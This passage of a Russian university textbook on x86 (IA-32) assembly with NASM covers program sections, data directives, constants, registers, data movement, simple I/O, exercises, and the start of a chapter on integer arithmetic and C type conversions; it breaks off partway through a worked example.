Ключевые слова: архитектура ЭВМ, язык ассемблера, x86, nasm, реализация языка
Си.

                                                                УДК 004.2+004.43(075.8)

                                                                      ББК 32.973-02я73

This textbook contains problems and exercises for the first part of the seminar activi-
ties of the "Computer architecture and assembly language" course for 1st year 1st
stream students of the faculty of Computational Mathematics and Cybernetics of Mos-
cow State University that had been delivered in 2010-2023. The textbook is aimed at
students learning the base programming course and at lecturers and postgraduate stu-
dents.
Key words: computer architecture, assembly language, x86, nasm, C language imple-
mentation.
ISBN 978-5-89407-529-7                           © Факультет вычислительной математики и ки-
                                                 бернетики МГУ имени М.В. Ломоносова, 2014,
                                                 2023

ISBN 978-5-317-04885-3                           © Кузьменкова Е.А., Махнычев В.С., Падарян В.А.,
                                                 2014, 2023



Содержание
Введение .................................................................................................................. 6
1. Организация ассемблерной программы ....................................................... 7
   Ассемблерная инструкция ................................................................................ 10
   Директивы определения данных ..................................................................... 10
   Константы ........................................................................................................... 12
   Классы памяти .................................................................................................... 13
   Пример 1-1 Минимальная программа ............................................................ 14
   Регистры общего назначения ........................................................................... 15
   Пересылка данных ............................................................................................. 16
   Обращение к памяти ......................................................................................... 16
   Сложение и вычитание...................................................................................... 17
   Пример 1-2 Определение значения регистра ................................................. 18
   Пример 1-3 Переворот байтов в двойном слове ............................................ 18
   Средства ввода/вывода .................................................................................... 20
   Пример 1-4 Hello, World! ................................................................................... 21
   Задачи ................................................................................................................. 22
2. Арифметика и целочисленные типы данных .............................................. 26
   Машинные данные и типы данных языка Си ................................................. 26
   Пример 2-1 Интерпретация арифметических инструкций ............................ 27
   Пример 2-2 Объявление переменной ............................................................. 28
   Пример 2-3 Приведение типа ........................................................................... 29
   Пример 2-4 Приведение беззнакового типа ................................................... 30
   Пример 2-5 Умножение .................................................................................... 31



                                                                                                                                 3
      Пример 2-6 Деление .......................................................................................... 32
      Пример 2-7 Арифметика «длинных» чисел .................................................... 33
      Задачи ................................................................................................................. 34
    3. Указатели и адресная арифметика ............................................................... 37
      Взятие адреса и разыменование...................................................................... 37
      Отображение оператора разыменования в язык ассемблера...................... 37
      Пример 3-1 Двукратное разыменование ........................................................ 37
      Пример 3-2 Разыменование и побочные эффекты ........................................ 38
      Пример 3-3 Восстановление кода .................................................................... 40
      Указатели и массивы ......................................................................................... 41
      Пример 3-4 Адресная арифметика и массивы ................................................ 42
      Пример 3-5 Массив указателей ........................................................................ 43
      Задачи ................................................................................................................. 43
    4. Операции над битовыми векторами ............................................................ 46
      Поразрядные (побитовые) операции .............................................................. 46
      Пример 4-1 Логические операции над битовыми векторами ...................... 46
      Сдвиги и вращения ............................................................................................ 47
      Пример 4-2 Двигаем и вращаем ...................................................................... 48
      Пример 4-3 Реализация умножения регистра на константу через сложения
      и сдвиги ............................................................................................................... 48
      Пример 4-4 Восстановление выражения ........................................................ 49
      Пример 4-5 Обращение операций ................................................................... 50
      Пример 4-6 Безусловный модуль .................................................................... 51
      Манипуляции с отдельными битами ............................................................... 52
      Пример 4-7 Установка и сброс отдельных битов............................................ 52
      Задачи ................................................................................................................. 52
    5. Управляющие конструкции ........................................................................... 55
      Безусловная и условная передача управления .............................................. 55
      Операции над булевыми переменными ......................................................... 56
      Пример 5-1 Восстановление типа и операции сравнения ............................. 56



4
   Реализация ветвления и цикла......................................................................... 57
   Пример 5-2 Ветви прорастают .......................................................................... 58
   Пример 5-3 Геометрическая прогрессия ......................................................... 59
   Короткая логика ................................................................................................. 61
   Пример 5-4 Восстановление управляющих конструкций .............................. 61
   Условная передача данных ............................................................................... 63
   Задачи ................................................................................................................. 64
Текст учебной библиотеки ввода/вывода .......................................................... 69
Ответы и решения ................................................................................................. 72
Литература ............................................................................................................. 80




                                                                                                                                 5
    Введение
    Пособие содержит кратко изложенный материал семинарских занятий по
    курсу «Архитектура ЭВМ и язык ассемблера», читаемого для студентов 1 по-
    тока 1 курса факультета ВМК МГУ. Рассматриваются темы занятий первой
    половины семестра, такие как: организация ассемблерной программы, рабо-
    та с целочисленными типами данных и указателями, условная и безусловная
    передача управления. Основной целью семинарских занятий является прак-
    тическое знакомство с механизмами реализации программ, написанных на
    языке Си.

    Каждая рассматриваемая тема содержит краткий вводный материал, де-
    тально разобранные типовые задачи и задачи для самостоятельной работы,
    часть которых снабжена ответами.

    Методическое пособие предназначено для преподавателей, ведущих прак-
    тические занятия в поддержку лекционного курса «Архитектура ЭВМ и язык
    ассемблера» для студентов 1 курса, а также рекомендуется студентам при
    подготовке к письменному экзамену.

    В настоящем издании существенно переработаны и дополнены разделы по-
    собия, посвященные описанию операций над битовыми векторами и управ-
    ляющих конструкций языка, а также расширен набор предлагаемых приме-
    ров и задач.




6
1.   Организация ассемблерной программы
Пользовательская (прикладная) программа, написанная для платформ IA-
32/Linux или IA-32/Windows, рассчитана на выполнение в машине, реализу-
ющей принципы фон Неймана (Рис. 1). Машинные команды и данные хра-
нятся совместно в оперативной памяти, а процессор в автоматическом ре-
жиме последовательно читает из памяти команды и исполняет их. Опера-
тивная память разбита на ячейки размером по 8 двоичных разрядов (1 байт),
ячейки пронумерованы числами от 0 до 232-1 (номер ячейки называют ее
адресом). Процессор содержит набор 32-х разрядных регистров, состоящий
из восьми регистров общего назначения, счетчика команд, регистра состоя-
ния. Взаимодействие процессором с оперативной памятью осуществляется
через шину, позволяющей процессору считывать значения ячеек оператив-
ной памяти, записывать в ячейки новые значения.




 Рисунок 1 - Упрощенная схема виртуальной машины IA-32, используемой
                       прикладной программой.

Программа, которая готова к исполнению процессором, представляет собой
определенный набор значений ячеек оперативной памяти. Эти значения за-
носит в оперативную память загрузчик — компонент операционной системы,
отвечающий за загрузку исполняемого файла (копирование его содержимо-
го) в память. Для формирования исполняемого файла используются инстру-
менты системы программирования; основными инструментами являются
компилятор, ассемблер, компоновщик (Рис. 2).

Машина IA-32 позволяет обращаться к произвольному месту оперативной
памяти, однако не все ячейки доступны, обращения к одним адресам за-



                                                                            7
    вершатся успешно, к другим – приведут к аварийной остановке программы.
    Причиной является то, что пользовательская программа работает в защи-
    щенном режиме процессора: фактически ей доступны только определенные
    диапазоны адресов, содержащие образ программы в памяти. Управление
    памятью, доступной пользовательской программе, осуществляет операци-
    онная система, этот вопрос выходит за рамки данного курса.




    Рисунок 2 - Упрощенная схема компиляции и выполнения прикладной про-
                                   граммы.

    Язык ассемблера позволяет программисту описывать содержимое ячеек
    оперативной памяти не в виде двоичных чисел, а в виде более удобных для
    человека конструкций и мнемонических обозначений. Программа на языке
    ассемблера представляет собой текстовый файл. Программист определяет в
    этом текстовом файле набор секций. В результате перевода (трансляции)
    текста программы каждая секция будет превращена в последовательность
    байт. При запуске программы каждая такая последовательность байт будет
    загружена в оперативную память и размещена в выделенных для нее ячей-
    ках памяти. Операционная система выделяет отдельные блоки памяти под
    машинные команды, константы, переменные трех классов памяти (в терми-
    нологии языка Си): статические, автоматические, динамические. Секции ас-
    семблерного файла содержат только машинные команды, константы и ста-
    тические переменные, память для «кучи» и автоматических переменных в
    начальный момент работы программы выделяется операционной системой.
    Эта память доступна для использования, но изначально ничем не заполнена,
    т.е. содержит произвольные значения.




8
Способ записи машинных команд и определения данных в секциях исходно-
го (текстового) файла определяется синтаксисом ассемблера. Для архитекту-
ры IA-32 существует два основных синтаксиса: AT&T и Intel. Каждая конкрет-
ная реализация ассемблера вносит свои изменения в синтаксис, образуя
диалект.

В рамках данного курса рассматривается ассемблер NASM (Netwide Assem-
bler), версии которого существуют под большое количество платформ, вклю-
чая Microsoft Windows и различные виды UNIX-систем. Скачать ассемблер и
документацию к нему можно с официального сайта http://www.nasm.us/.

Программы на языке ассемблера представляют собой текстовые файлы с
расширением .asm. Как уже говорилось, файл состоит из нескольких секций,
в которых размещается код программы (последовательность ассемблерных
инструкций) и ее данные.

В простых программах набор секций, как правило, ограничен тремя (не счи-
тая служебных):

    секция кода, которая обычно называется .text;
    секция инициализированных данных (то есть тех, для которых опреде-
     лено начальное значение), которая обычно называется .data;
    секция неинициализированных данных, значения которых обнуляются
     операционной системой перед запуском программы; эта секция обыч-
     но называется .bss.
В ассемблерном файле могут присутствовать и другие секции. Например,
может быть несколько секций кода или данных, однако мы такие програм-
мы рассматривать не будем. Программа воспринимается построчно. Каждая
строка, как и во многих других ассемблерах, представляет собой последова-
тельность следующих полей:

   метка — присваивает имя данному месту в программе, вне зависимости
    от того, что на этом месте расположено (код/данные);
   ассемблерная инструкция, состоит из кода операции и операндов (если
    они есть), перечисляемых через запятую;
   директива определения данных;
   комментарий.
Допустимы пустые строки. Кроме того, на отдельных строках могут быть за-
писаны служебные директивы, указывающие ассемблеру, каким образом
следует размещать код и данные в памяти.




                                                                             9
     Ассемблерная инструкция
     Строка с описанием ассемблерной инструкции имеет следующий вид:


       метка:    код_опреации операнды     ; комментарий

     Имена меток не должны повторяться (за исключением локальных меток, ко-
     торые будут рассмотрены во второй части пособия). Допустима ситуация, ко-
     гда ассемблерная инструкция пропущена и строка содержит только метку с
     двоеточием. Такое форматирование текста практикуют для лучшей читаемо-
     сти ассемблерного кода. Инструкция отделяется от операндов одним или
     несколькими пробелами или символами табуляции, а операнды, если они
     есть, должны быть отделены друг от друга запятыми и, возможно, пробель-
     ными символами и символами табуляции. В конце строки может находиться
     комментарий, начинающийся с символа «точка с запятой». Комментарий
     продолжается до конца строки.

     Директивы определения данных
     Строка с описанием данных имеет следующий вид:


       имя_переменной [:]     директива_определения_данных       ; комментарий

     При описании данных, после имени переменной может присутствовать
     двоеточие; фактическое использование ассемблером символьного имени
     переменной в точности совпадает с использованием меток, помечающих
     код.

     Для определения переменных с начальными значениями используются ди-
     рективы DB, DW, DD и DQ. Например:


       имя_переменной DD значение1[, значение2, ... ]


     Директива DB предназначена для определения данных размером в байт, DW,
     DD и DQ определяют данные размером соответственно в слово (2 байта),
     двойное слово (4 байта) и учетверенное слово (8 байтов). Например:




10
  x   dw   -1          ; Определение переменной x в формате слова с
                       ; начальным значением -1
  y   dd     1, 2, 3   ; Определение трех двойных слов с начальными
                       ; значениями 1, 2, 3


Последняя директива описывает тот факт, что в памяти, начиная с адреса у,
последовательно размещаются три двойных слова с указанными значения-
ми, при этом первое двойное слово располагается в памяти по адресу y, вто-
рое – по адресу y+4, третье – по адресу y+8.

В общем случае, через запятую перечисляется набор значений, который бу-
дет размещен в памяти, начиная с адреса, помеченного как
имя_переменной.

NASM не позволяет указывать неопределенное начальное значение (в
MASMe для этого служил знак ?). Если начальное значение переменной не
важно, ее следует располагать в секции .bss, все байты которой инициализи-
руются нулем. Такая особенность позволяет экономить место в файле с ис-
полняемым кодом: содержимое секции заранее известно, достаточно хра-
нить только ее размер. При объявлении переменных в секции .bss необхо-
димо использовать соответствующие директивы: RESB, RESW, RESD и RESQ,
имеющие следующий формат.


  имя_переменной RESB количество_ячеек


Под количеством ячеек понимается число байт, слов, двойных или четвер-
ных слов, в зависимости от использованной директивы.


  a   resd      1   ; Выделено место для одной переменной, ее размер –
                    ; двойное слово, начальное значения – 0
  b   resb      20 ; Выделено место для последовательно размещенных
                    ; 20 байт
  c   resw      256 ; Выделено место для 256 слов


Имена a, b и c являются адресами, начиная с которых размещены обнулен-
ные данные.

В качестве конструкции повторения в ассемблере NASM используется пре-
фикс TIMES (в отличие от DUP в MASMe):



                                                                             11
       TIMES количество_раз повторяемая конструкция


     Пример – требуется объявить переменную с именем zerobuf, представляю-
     щую собой буфер размером в 64 байта и заполненный нулями.

      zerobuf times 64 db 0

     Аргумент конструкции TIMES не константа, а вычисляемое выражение, что
     позволяет реализовывать, например, следующее:

      buffer: db ‘hello, world!’
              times 64-$+buffer db ‘ ’

     Начиная с метки buffer будет выделено 64 байта, первые байты будут за-
     полнены заданной строкой, остальные – пробелом. Лексема $ соответствует
     текущей позиции в транслируемом коде. Выражение $-buffer, записанное
     непосредственно после первой строки, будет содержать длину строки ‘hel-
     lo, world!’.

     Константы
     Ассемблер NASM поддерживает несколько типов констант: целочисленные,
     символы, строки и числа с плавающей точкой.

     У целочисленных констант поддерживаются различные основания: десятич-
     ное, двоичное, восьмеричное, шестнадцатеричное. Для явного задания ос-
     нования следует воспользоваться соответствующими суффиксами: d, b или y,
     o или q, h. По-умолчанию последовательность цифр рассматривается как де-
     сятичное число. Помимо того, допустимы формы задания основания в виде
     префиксов: 0d – десятичное 0b – двоичное, 0o – восьмеричное, 0h – шестна-
     дцатеричное. Допускается запись шестнадцатеричных чисел как в Си-
     программах, с префиксом 0x.

     Целочисленные константы могут содержать символ подчеркивания для раз-
     деления длинных последовательностей цифр.




12
           mov      ax,200            ; десятичное
           mov      ax,0200d          ; явно указанное десятичное
           mov      ax,0c8h           ; шестнадцатеричное
           mov      ax,0xc8           ; шестнадцатеричное
           mov      ax,310q           ; восьмеричное
           mov      ax,11001000b      ; двоичное
           mov      ax,1100_1000b     ; двоичное

Во всех случаях приведен один и тот же код.

Символьная константа содержит от одного до восьми символов, заключен-
ных в прямые, обратные или двойные кавычки. Тип кавычек для NASM не-
существенен, поэтому если используются одинарные кавычки, двойные мо-
гут выступать в роли символа и, соответственно, наоборот. Обратные кавыч-
ки позволяют использовать специальные символы языка Си.

Символьная константа, состоящая из одного символа, эквивалентна целому
числу, равному коду этого символа. Символьная константа, содержащая бо-
лее одного символа, будет транслирована посимвольно в обратном порядке
следования байтов: 'abcd' эквивалентно не 0x61626364, а 0x64636261. Эта
особенность обусловлена порядком хранения байтов целого числа в памяти:
сначала хранятся младшие байты, за ними — старшие. Таким образом, если
записать эту константу в память, а затем прочитать побайтово, получится
снова abcd, но не dcba.

Строковые константы допустимы только в директивах db/dw/dd/dq. От сим-
вольных констант они отличаются только отсутствием ограничения на длину
и интерпретируются как сцепленные друг с другом символьные константы
максимального допустимого размера.

  dd 'ninechars'       ; строковая константа – последовательность
                       ; двойных слов
  dd 'nine','char','s' ; явно заданы три двойных слова
  db 'ninechars',0,0,0 ; последовательность байт

Во всех случаях определены одни и те же данные.

Классы памяти
В стандарте языка Си определены три класса памяти (storage duration): ста-
тическая, автоматическая, динамическая. К статическому классу памяти от-
носятся глобальные и статические переменные. В зависимости от того, как
выполняется инициализация, переменные этого класса помещаются компи-



                                                                             13
     лятором либо в секцию .data, либо в секцию .bss. Такие вопросы, как раз-
     мещение автоматических локальных переменных и работа с динамической
     памятью, в этой части пособия не рассматриваются.

     Пример 1-1 Минимальная программа
     Требуется написать минимальную ассемблерную программу.

                                      Решение


       section .text        ; (1)
                            ; (2)
       global main          ; (3)
       main:                ; (4)
          MOV EAX, 0        ; (5)
          RET               ; (6)


     Данная ассемблерная программа ничего не делает и при запуске практиче-
     ски сразу возвращает управление операционной системе. Разберем ее по-
     строчно. Первая строка содержит директиву, указывающую, что последую-
     щие строки относятся к секции кода программы (конкретнее — к секции
     .text). Вторая строка оставлена пустой для наглядности отделения директи-
     вы от остального текста ассемблерной программы.

     В третьей строке содержится директива, предписывающая сделать имя main
     видимым «снаружи» данного модуля (ассемблерного файла). На четвертой
     строке это имя используется в метке, которая помечает им инструкции на
     строке 5. Таким образом, метка main начинает описание функции с соответ-
     ствующим именем. Как и для программ, написанных на языке Си, функция
     main является точкой входа в программу.

     На пятой строке выполняется инструкция MOV, в которой в регистр EAX поме-
     щается число 0. На следующей строке выполняется инструкция RET, завер-
     шающая выполнение функции.

     Рассмотренный пример можно соотнести со следующей Си-программой.




14
  #include <stdio.h>

  int main (void) {
     return 0;
  }


Пара инструкций 5 и 6 в ассемблерной программе соответствует оператору
return 0; Она необходима для правильной обработки программы в систе-
ме автоматического приема задач – правильно отработавшая программа
должна возвращать число 0.

Регистры общего назначения
Процессор IA-32 содержит восемь 32-разрядных регистров общего назначе-
ния: EAX, EBX, ECX, EDX, ESI, EDI, EBP, ESP (Рис. 3). Каждый из них допускает
непосредственный доступ к своей младшей половине по имени соответ-
ственно AX, BX, CX, DX, SI, DI, BP, SP. Таким образом, программист имеет
возможность работать с 16-разрядными регистрами с указанными именами.
Кроме того, регистры AX, BX, CX, DX в свою очередь допускают независимый
доступ к своей младшей и старшей половине по именам соответственно AL,
AH, BL, BH, CL, CH, DL, DH, обеспечивая возможность работать уже с 8-
разрядными регистрами. Буква L в имени регистра обозначает младшую по-
ловину соответствующего 16-разрядного регистра, буква H – старшую.




                   Рисунок 3 – Основные регистры IA-32.




                                                                                15
     Пересылка данных
     Самая простая и часто используемая инструкция архитектуры IA-32 — ин-
     струкция пересылки MOV. Она имеет всегда два операнда, которые должны
     подходить под один из следующих форматов:

          MOV регистр, константа — запись значения константы в регистр;
          MOV регистр-1, регистр-2 — запись значения из регистра-2 в ре-
           гистр-1;
          MOV регистр, память — запись в регистр значения из памяти;
          MOV память, регистр — запись в память значения из регистра;
          MOV память, константа — запись значения константы в память.
     Необходимо обратить внимание на то, что целевой операнд находится слева
     (как бы перед «присваиванием»), а исходный — справа. Данный порядок
     операндов является одной из характерных черт синтаксиса Intel. Кроме того,
     важно, что в инструкции MOV размеры операндов обязаны совпадать (то есть
     нельзя переслать в регистр AX из регистра EBX).

         section .text      ; (1)
                            ; (2)
         global main        ; (3)
         main:              ; (4)
            MOV EAX, 1      ; (5) EAX := 1
            MOV EBX, EAX    ; (6) EBX := EAX = 1
            MOV CL, 040h    ; (7) CL := 040h = 0x40 = 64
            MOV EAX, 0      ; (8)
            RET             ; (9)


           Команда XCHG выполняет обмен значений своих операндов (операнды
     обязательно должны быть одинакового размера). Допустимы следующие
     форматы этой команды:

          XCHG регистр-1, регистр-2
          XCHG регистр, память
          XCHG память, регистр

     Обращение к памяти
     Обращение к операнду в памяти в простейшем случае имеет вид:
           спецификатор размера [имя переменной], где спецификатор разме-
     ра (dword, word или byte) задает размер соответствующей переменной в па-
     мяти. Например, dword [a] – обращение к переменной a в формате двойно-
     го слова (32 бита).




16
В записи операнда важную роль играют квадратные скобки вокруг имени
переменной. Именно такая запись трактуется в NASM как содержимое ячей-
ки памяти по указанному адресу, т.е. значение по данному адресу, тогда как
просто имя переменной трактуется как адрес соответствующей ячейки памя-
ти. Сравните:

 mov eax, dword [a] ; В регистр eax помещается значение переменной a
 mov eax, a         ; В регистр eax помещается адрес переменной a


При выполнении второй команды обращения к памяти не происходит.

Сложение и вычитание
Арифметические инструкции сложения и вычитания для целых чисел назы-
ваются ADD и SUB. У них нет отдельных версий для знаковых и беззнаковых
целых чисел, они применимы в обоих случаях.


  ADD EBX, EAX
  ; EBX := EBX + EAX = 1 + 1 = 2, EAX не меняется

  ADD EBX, EBX
  ; EBX := EBX + EBX = 2 * EBX = 4

  SUB EAX, 2
  ; EAX := EAX - 2 = 1 - 2 = -1 = 0FFFFFFFFh

  ADD AX, 1
  ; AX := AX + 1 = 0FFFFh + 1 = -1 + 1 = 0
  ; EAX стал равен 0FFFF0000h


Первый операнд ADD и SUB — целевой. Это тот операнд, к значению которого
будет прибавлено (или от которого будет отнято) значение второго операн-
да. Результат операции также записывается в первый операнд. Целевой опе-
ранд может быть регистром или операндом в памяти. Второй операнд (то,
что прибавляется или отнимается) может быть регистром, операндом в па-
мяти или константой.

Важно: ни в какой инструкции, кроме строковых, не может быть два операн-
да в памяти.




                                                                             17
     Пример 1-2 Определение значения регистра
     Пусть ассемблерная переменная A имеет значение 0x CAFE BABE. Требуется
     выписать в шестнадцатеричном виде значение регистра AX после выполне-
     ния следующих инструкций.


       MOV AX, WORD [A + 2]
       ADD AX, 3


                                        Решение

     Рассмотрим расположение в памяти переменной A и определим, что будет в
     регистре AX, после выполнения первой инструкции. Поскольку в архитектуре
     IA-32 используется обратное расположение байтов в памяти, то получаем
     следующее:




     Байт с адресом A+2 будет иметь значение 0xFE, следующий за ним – 0xCA.
     При пересылке в регистр байты поменяются местами, и регистр AX будет
     иметь значение 0xCAFE. После того, как к этому значению будет прибавлено
     3, оно станет равным 0xCB01.

     Пример 1-3 Переворот байтов в двойном слове
     В памяти последовательно расположены 4 переменных a, b, c и d размером
     1 байт каждая в заданном порядке. Требуется сформировать 32-битное чис-
     ло в регистре EAX таким образом, чтобы старший байт числа совпадал со
     значением переменной a, следующий за ним байт – со значением b, следу-
     ющий – со значением c, и, наконец, младший байт – со значением d. Пусть,
     для примера, значения a, b, c и d равны 1, 2, 3, 4 соответственно. Тогда в ре-
     гистре EAX будет размещено число 0x01020304.

                                        Решение

     Требуемый порядок размещения байтов является обратным по отношению к
     тому, который получится при считывании 32-разрядного числа с адреса a.


18
Необходимо сформировать число в регистре с обратным порядком байтов.
Воспользуемся для этого вспомогательной статической переменной и пере-
местим отдельные байты таким образом, что при считывании из нее двойно-
го слова будет получаться необходимый порядок байтов в регистре.




  section .bss
     tmp resd 1

  section .data
     a db 1
     b db 2
     c db 3
     d db 4

  section .text
     mov al, byte [a]
     mov byte [tmp + 3], al
     mov al, byte [b]
     mov byte [tmp + 2], al
     mov al, byte [c]
     mov byte [tmp + 1], al
     mov al, byte [d]
     mov byte [tmp], al
     mov eax, dword [tmp]




                                                                          19
     Средства ввода/вывода
     Для считывания данных, вводимых с клавиатуры, и печати данных на экран
     (консоль) предлагается набор функций, позволяющих считывать и печатать
     числа в шестнадцатеричном и десятичном формате, строки и отдельные
     символы. Приведенные функции реализованы через вызовы функций стан-
     дартной библиотеки ввода/вывода языка Си, поэтому форматы принимае-
     мых и выводимых данных для них полностью аналогичны форматам для вы-
     зовов соответствующих функций стандартной библиотеки.
     Подробнее ознакомиться с реализацией этих функций можно, изучив текст
     учебной библиотеки ввода/вывода в соответствующем разделе в конце по-
     собия.
     Таблица 1. Сводная таблица функций ввода/вывода.

      Функция                 EAX             EDX         ECX     EFLAGS


      io_get_dec


      io_get_udec         выход: число         -           -         -


      io_get_hex


      io_get_char        выход: символ         -           -         -


      io_get_string        вход: адрес    вход: размер     -         -

      io_print_dec


      io_print_udec        вход: число         -           -         -


      io_print_hex


      io_print_char       вход: символ         -           -         -


      io_print_string      вход: адрес         -           -         -


      io_newline                -              -           -         -




20
Значения регистров EBX, EBP, ESP, EDI, ESI не изменяются.
Вызовы произвольных функций будут рассмотрены более подробно во второй ча-
сти данного пособия. Пока достаточно считать вызовы функций, приведенных в
таблице 1, инструкциями, обладающими определенными побочными эффектами
то есть изменяющими состояние регистров и памяти в соответствии с их описани-
ем.
Гарантируется, что в результате вызовов функций ввода/вывода значения реги-
стров EBX, EBP, ESP, EDI, ESI не изменяются. Значения EAX, EDX и ECX потенциально
могут быть изменены, поэтому если какое-либо из этих значений понадобится в
программе после вызова одной из этих функций, необходимо предварительно со-
хранить его на другом регистре (из множества сохраняемых) либо в памяти.

Пример 1-4 Hello, World!
Требуется написать программу «Hello, World!» на языке ассемблера.

                                  Решение

Программа расширяет Пример 1-1: помимо секции .text, используется секция
инициализированных статических данных .data, в которой размещена последова-
тельность байтов с текстом (строка 4). Для ссылки на эту последовательность ис-
пользуется имя str, после которого идет двоеточие. Наличие двоеточия в данном
случае является обязательным, если его убрать ассемблер при трансляции кода
выдаст ошибку со следующей диагностикой

  hello.asm:4: error: comma, colon or end of line expected

Объясняется эта ошибка тем, что набор команд IA-32 содержит команду с мнемо-
ническим именем str. Запись объявления данных с именем str без символа двое-
точия делает для ассемблера эту строку неотличимой от строки с командой str.
Исправить ситуацию можно либо поместив двоеточие после имени, либо исполь-
зуя имена, не пересекающиеся с мнемоническими именами команд.
       extern io_print_string                ; (1)
                                             ; (2)
       section .data                         ; (3)
          str: db `Hello, World!\n`, 0       ; (4)
                                             ; (5)
       section .text                         ; (6)
                                             ; (7)
       global main                           ; (8)
       main:                                 ; (9)
          MOV EAX, str                       ; (10)
          CALL io_print_string               ; (11)
          MOV EAX, 0                         ; (12)
          RET                                ; (13)


     Директива extern, использованная на строке 1, аналогична ключевому слову ex-
     tern в языке Си. Она позволяет объявить имя, не определяемое в данном модуле
     (в случае io_print_string, оно будет связано с определением в учебной биб-
     лиотеке ввода/вывода).

     В записи значения строки используются обратные кавычки, что позволяет внести
     символ переноса строки непосредственно в последовательность байтов. Следует
     отметить, что символ-ограничитель 0 должен явно дописываться в конец строк. В
     случае Си-кода этот символ автоматически добавляется компилятором, на уровне
     языка ассемблера это обязанность программиста.

     Последнее отличие от Примера 1-1 – наличие на строке 11 вызова функции
     io_print_string, которой в качестве ее единственного аргумента передается ис-
     полнительный адрес, ссылающийся на то место памяти, где расположена строка
     «Hello, World!\n». Как сообщается в таблице 1, эта функция принимает значение
     аргумента через регистр EAX. Команда MOV на строке 10 пересылает желаемое зна-
     чение в регистр.

     Задачи
     Задачи, название которых подчеркнуто, снабжены ответом, приведенным в конце
     пособия.

     Задача 1-1 Представление чисел
     Рассматривается представление целых чисел в формате байта. Заполните все пу-
     стые ячейки таблицы, указав для каждого из приведенных чисел его представле-
     ние в виде десятичного числа без знака, числа со знаком, а также представление в
     виде шестнадцатеричного и двоичного кодов.




22
      Двоичное               16-ричное         Число десятичное   Число десятичное
 представление (байт)   представление (байт)      со знаком           без знака
                                                     -67
      01110110
                                28h
                                                                        135

Задача 1-2 Определение переменных
Для каждой из указанных директив привести эквивалентную ей директиву, где
начальное значение переменной представлено в 16-ричном виде.


  section .data
     a dw -2076
     b dd -1
     c db 128
     d dw 256
     e dd -15
     f db -100

Задача 1-3 Директивы описания данных
Используя только директивы DB, привести описания, эквивалентные заданным.


  ; a                      ; e                         ; i
  DW 185Ah                 DW 'AB'                     DD 97
  ; b                      ; f                         ; j
  DW 90                    DW "NASM"                   DD "x"
  ; c                      ; g                         ; k
  DW 9000                  DW "Hello"                  DD 'CD'
  ; d                      ; h                         ; l
  DW 10000, -10000         DW "w", "orld", "!"         DD "Hello, world!"


Задача 1-4 Ошибки в коде
Даны описания.


  b resb 1
  w resw 1
  y resw 1
  d resd 1


Вычеркнуть синтаксически неверные инструкции.




                                                                                23
       ; a                    ; e                      ; i
       mov b, 1               mov ecx, cx              mov word[w], word[y]
       ; b                    ; f                      ; j
       mov byte [b], 1        mov bh, cl               add 15, bx
       ; c                    ; g                      ; k
       mov word [b], 1        mov dword [d], esi       sub word [y], 8
       ; d                    ; h                      ; l
       mov ax, bx             mov byte [w], ch         sub eax, dword [d]


     Задача 1-5 Определение значения регистра
     Выписать в шестнадцатеричном виде значение регистра EAX, после выполнения
     каждой помеченной инструкции. Следует отметить, что в каждой последователь-
     ности команд «а»-«ж» и «з»-«к» необходимо учитывать уже имеющееся значение
     регистра EAX.

       section .data
          a dw 0xDEAD
          b dw 0xF00D
          c dw 0xCAFE
          d dw 0xBABE

       section .text
          movsx eax, word [a + 1] ; (а)
          movsx ax, byte [b]      ; (б)
          movzx eax, word [c]     ; (в)
          movsx eax, byte [b + 2] ; (г)
          movzx ax, byte [d + 1] ; (д)
          movsx eax, word [b + 1] ; (е)
          mov   bx, word [a + 1] ;
          movsx ax, bh            ; (ж)




24
  section .data
     a dw 0x0DEC
     b dw 0x4A6F
     c dw 0x7921
     d dw 0xFEFF

  section .text
     mov   ebx, dword [b]     ;
     mov   eax, -1            ;
     movzx ax, bl             ; (з)
     mov   ecx, dword [a + 1] ;
     mov   eax, dword [b + 1] ;
     movsx ax, cl             ; (и)
     mov   eax, dword [c]     ;
     bswap eax                ; (к)


Задача 1-6 Перемещение данных
Привести фрагмент кода, осуществляющего пересылку данных, как это указанно на
рисунке.




                                                                           25
     2.      Арифметика и целочисленные типы данных
     Основные арифметические операции реализуются в языке ассемблера инструкци-
     ями ADD, SUB, NEG, MUL/IMUL, DIV/IDIV. Помимо того, операции уменьшения и уве-
     личения числа на единицу поддержаны инструкциями DEC и INC. Сложение и вы-
     читание чисел большей длины, чем размер регистров поддержано инструкциями
     ADC и SBB. В определенных случаях для более быстрого вычисления арифметиче-
     ских выражений допустимо использовать инструкцию LEA. Выполнение арифмети-
     ческих операций сопровождается выработкой флагов регистра EFLAGS: CF – пере-
     нос, OF – переполнение, SF – знак, ZF – ноль, PF – четность.

     Таблица 2. Коды описания флагов .

     T        Значение флага влияет на выполнение инструкции
     M        Инструкция меняет флаг (устанавливает или сбрасывает, в зависимости
              от операндов)
     -        Влияние инструкции на флаг не определено
     Пусто    Инструкция не влияет на флаг


     Таблица 3. Перекрестные ссылки регистра флагов.

                                         OF       SF       ZF        PF       CF
     ADC, SBB                            M        M         M        M       TM
     ADD, SUB, NEG                       M        M         M        M       M
     MUL, IMUL                           M        -         -        -       M
     DIV, IDIV                           -        -         -        -        -
     DEC, INC                            M        M         M        M
     MOV, XCHG, MOVSX, MOVZX, LEA


     Машинные данные и типы данных языка Си
     Объявление переменной в ассемблерной программе требует указания объема вы-
     деляемой памяти. Интерпретация содержимого переменной определяется исклю-
     чительно кодом операции.

     Перевод выражений языка Си на язык ассемблера сопровождается реализацией
     приведений типов, которые явно или неявно присутствуют в вычислениях.

     Приведение целочисленных типов языка Си можно реализовать путем расширения
     размера данных при пересылке значений с помощью команд MOVZX и MOVSX. При
     этом команда MOVZX выполняет беззнаковое расширение данных (число до нужно-
     го размера дополняется слева нулями), а команда MOVSX – знаковое расширение
     данных (число до нужного размера дополняется слева битами со значением зна-

26
кового разряда исходного числа, т.е. нулями для неотрицательного числа и едини-
цами для отрицательного числа).


  mov       bx, 0xA67B ;     bx ← 0xA67B
  movzx    ebx, bx     ;     ebx ← 0x0000A67B
  movsx    eax, bx     ;     eax ← 0xFFFFA67B
  movsx    ecx, bl     ;     ecx ← 0x0000007B


Пример 2-1 Интерпретация арифметических инструкций
Выпишите значение регистра AL в виде десятичного числа (знакового и беззнако-
вого), а также флаги CF, OF, ZF и SF после выполнения следующих инструкций.


      MOV AL, 70
      SUB AL, 130


                                    Решение

   ALзнаковое = -60, ALбеззнаковое = 196, CF = 1, OF = 1, ZF = 0, SF = 1.

Для наглядности формирования значений флагов промоделируем выполнение за-
данного фрагмента кода над шестнадцатеричным представлением данных.
        70 = 46h,         130 = 82h

